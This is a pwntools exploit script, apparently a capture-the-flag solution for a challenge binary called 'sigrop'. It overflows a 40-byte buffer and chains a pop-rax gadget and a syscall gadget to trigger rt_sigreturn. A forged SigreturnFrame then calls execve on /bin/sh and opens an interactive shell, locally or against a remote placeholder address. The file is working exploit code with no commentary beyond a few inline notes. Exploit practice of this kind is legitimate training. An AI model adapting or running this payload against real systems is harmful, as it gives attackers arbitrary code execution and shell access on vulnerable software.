#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("sigrop")

gs = '''
b *main+51
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("address", 12345)
    else:
        return process(elf.path)

p = start()

BINSH = elf.address + 0x2004
POP_RAX = 0x401169
SYSCALL = 0x40116b

frame = SigreturnFrame()
frame.rax = 0x3b            # syscall number for execve
frame.rdi = BINSH           # pointer to /bin/sh
frame.rsi = 0x0             # NULL
frame.rdx = 0x0             # NULL
frame.rip = SYSCALL

payload = b'A' * 40
payload += p64(POP_RAX)
payload += p64(0xf)
payload += p64(SYSCALL)
payload += bytes(frame)

p.sendline(payload)
p.interactive()
